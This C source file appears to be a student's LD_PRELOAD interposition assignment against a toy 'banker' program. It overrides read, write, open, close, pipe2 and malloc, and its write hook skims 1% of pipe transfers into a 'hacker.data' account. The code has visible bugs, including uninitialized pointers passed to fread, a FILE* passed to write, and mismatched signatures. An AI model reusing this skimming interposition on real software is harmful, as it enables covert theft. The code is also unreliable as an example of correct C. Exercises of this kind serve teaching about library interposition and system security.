#include<stdint.h>
#include<fcntl.h>
#include<stdio.h>
#include<dlfcn.h>
#include<string.h>
#include<errno.h>
#include<execinfo.h>
#include<sys/types.h>
#include<unistd.h>
#include<stdarg.h>
#include<sys/stat.h>
/* We aren't providing much code here.  You'll need to implement quite a bit
 * for your library. */

/* Declarations for the functions in part2_hash.cc, so that we don't need an
 * extra header file. */
void malloc_insert(size_t size);
void malloc_dump();
void so_allocate();
void so_deallocate();

static int ignoreMalloc = 0;
static int amountTransfer = 0;
static int fileindex = 0;
static int rfd;
/*The banker will do a bunch of transfers between accounts. Your job is to fake the file system. When the banker requests to open a file, do not actually open it, pretend you opened it.
*Since you can interposition all file I/O, whenever the banker tries to use the file that you never opened, you can handle it and fake a valid response. (done)
*For the fake account, use the data from the actual account (you can open/read/close it).
*When the banker closes a fake file, make sure the updated value ends up in the real file.
*/

typedef struct account
{
	int fd;
	int effectiveAmount;
	int origbal;
}account;


static struct account AccArray[7];

ssize_t read(int fd, void* buf, size_t bytes)
{
	int (*oRead)(int fd, void* buf, size_t bytes) = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "read");
	int bytes_read = oRead(fd, buf, bytes);
	int* porigamount = (int*) buf;
	AccArray[fd].origbal = *porigamount;
	return bytes_read;
}

int pipe2(int* pipefd, int flags)
{
    int (*opipe2)(int *pipefd, int flags) = (int (*)(int, int))dlsym(RTLD_NEXT, "pipe2");
    int duh = opipe2(pipefd, flags);
    rfd = pipefd[1];
    return duh;
}

ssize_t write(int fd, void* buf, int bytes)
{
    int (*oWrite)(int fd, void* buf, size_t bytes) = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "write");
    if(rfd == fd)
    {
        int* pamount = (int*)buf;
        //stealing $5
        float steal = *pamount * 0.01;
        FILE* fp = fopen("hacker.data", "rw+");
        int* value;
        fread(value, sizeof(int), 1, fp);
        int amountWritten = *value + (int)steal;
        fprintf(stderr, "I got %d money in the bank\n", amountWritten);
        return oWrite(fp, &amountWritten, sizeof(int));
    }
    // write to the file
    AccArray[fd].effectiveAmount = *((int*)buf);
    return bytes;
}

int close(int handle)
{
	int (*oWrite)(int handle, void* buf, size_t bytes) = (int (*)(int, void*, size_t))dlsym(RTLD_NEXT, "write");
	//updating the balance of the file
	int buf = AccArray[handle].origbal + AccArray[handle].effectiveAmount;
	int status = oWrite(handle,&(buf), sizeof(int));
	//return 0 upon sucess else return -1
	if(status > 0)
	{
		return 0;
	}
	else
		return -1;
}

int open(const char* path, int flags)
{
	int (*oOpen)(const char* path, int flags) = (int (*)(const char*, int))dlsym(RTLD_NEXT, "open");
	int check = oOpen(path, flags);
	static void* (*origMalloc)(size_t) = NULL;
	origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	int origwrite = (size_t (*)(const void*, size_t, size_t, FILE*))dlsym(RTLD_NEXT, "fwrite");
	int (*ofcntl)(int fd, int cmd, ...) = (int (*)(int, int, ...))dlsym(RTLD_NEXT, "fcntl");
	if(ofcntl(check, 3, 1) != -1)
	{
		struct account* pacc = (struct account*)origMalloc(sizeof(account));
		pacc->fd = check;
		FILE* fp = fopen(path, "rw+");
		int* buff;
		fread(buff, sizeof(int), 1, fp);
		pacc->origbal = *buff;
		AccArray[check] = *pacc;
		free(pacc);
		return check;
	}
	else
	{
		return -1;
	}
}

/*
The banker will spawn a new process of itself to manage subbankers. Each subbanker will be assigned one of the seven baseline accounts (not hacker). 
It will use pipes and pipe communication to make transfers amongst the accounts. 
Intercept these and steal a small portion of each transfer (send this to hacker, which will always be the last set of pipes created). 
Output whenever you steal a portion and who would have gotten that money.
        Note: You are solving for this particular instance of the problem. A generic solution is non-trivial.
*/


int fgetc(FILE *stream)
{
	fprintf(stderr, "fgetc\n");
	return 1;
}


int putchar(int chars)
{
	fprintf(stderr, "putchar\n");
	return 1;
}

int fputc( int c, FILE *fp )
{
	fprintf(stderr, "fputc\n");
	return 1;
}


size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
{
	static size_t (*origfwrite)(const void*, size_t, size_t, FILE*) = NULL;
	if(!origfwrite)
	{
		origfwrite = (size_t (*)(const void*, size_t, size_t, FILE*))dlsym(RTLD_NEXT, "fwrite");
	}
    //fprintf(stderr, "fwrite\n");
    return origfwrite(ptr, size, nmemb, stream);
}

void *malloc(size_t bytes)
{
	static void* (*origMalloc)(size_t) = NULL;
	if(!origMalloc)
	{
		origMalloc = (void* (*)(size_t))dlsym(RTLD_NEXT, "malloc");
	}

	if(ignoreMalloc)
	{
		return origMalloc(bytes);
	}

	ignoreMalloc = 1;
	malloc_insert(bytes);
	ignoreMalloc = 0;

	return origMalloc(bytes);
}


__attribute__((destructor))
static void deallocate()
{
	malloc_dump();
	so_deallocate();
}


__attribute__((constructor))
static void allocate()
{
	so_allocate();
}

